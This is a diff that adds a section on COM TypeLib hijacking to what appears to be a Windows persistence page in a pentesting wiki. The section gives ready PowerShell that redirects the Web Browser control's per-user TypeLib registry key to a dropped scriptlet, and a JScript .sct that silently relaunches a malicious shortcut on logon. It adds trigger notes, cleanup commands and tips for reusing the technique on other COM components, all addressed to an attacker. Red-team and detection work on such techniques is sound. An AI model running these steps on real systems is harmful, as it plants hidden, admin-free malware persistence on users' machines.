@@ -78,6 +78,71 @@ Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5
 
 Then, you can just create the HKCU entry and everytime the user logs in, your backdoor will be fired.
 
+---
+
+## COM TypeLib Hijacking (script: moniker persistence)
+
+Type Libraries (TypeLib) define COM interfaces and are loaded via `LoadTypeLib()`. When a COM server is instantiated, the OS may also load the associated TypeLib by consulting registry keys under `HKCR\TypeLib\{LIBID}`. If the TypeLib path is replaced with a **moniker**, e.g. `script:C:\...\evil.sct`, Windows will execute the scriptlet when the TypeLib is resolved – yielding a stealthy persistence that triggers when common components are touched.
+
+This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).
+
+### Steps (PowerShell)
+
+1) Identify the TypeLib (LIBID) used by a high-frequency CLSID. Example CLSID often abused by malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
+
+```powershell
+$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
+$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
+$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
+"CLSID=$clsid  LIBID=$libid  VER=$ver"
+```
+
+2) Point the per-user TypeLib path to a local scriptlet using the `script:` moniker (no admin rights required):
+
+```powershell
+$dest = 'C:\\ProgramData\\Udate_Srv.sct'
+New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
+```
+
+3) Drop a minimal JScript `.sct` that relaunches your primary payload (e.g. a `.lnk` used by the initial chain):
+
+```xml
+<?xml version="1.0"?>
+<scriptlet>
+  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
+  <script language="JScript">
+    <![CDATA[
+      try {
+        var sh = new ActiveXObject('WScript.Shell');
+        // Re-launch the malicious LNK for persistence
+        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
+        sh.Run(cmd, 0, false);
+      } catch(e) {}
+    ]]>
+  </script>
+</scriptlet>
+```
+
+4) Triggering – opening IE, an application that embeds the WebBrowser control, or even routine Explorer activity will load the TypeLib and execute the scriptlet, re-arming your chain on logon/reboot.
+
+Cleanup
+```powershell
+# Remove the per-user TypeLib hijack
+Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
+# Delete the dropped scriptlet
+Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
+```
+
+Notes
+- You can apply the same logic to other high-frequency COM components; always resolve the real `LIBID` from `HKCR\CLSID\{CLSID}\TypeLib` first.
+- On 64-bit systems you may also populate the `win64` subkey for 64-bit consumers.
+
+## References
+
+- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+
 {{#include ../../banners/hacktricks-training.md}}
 
 
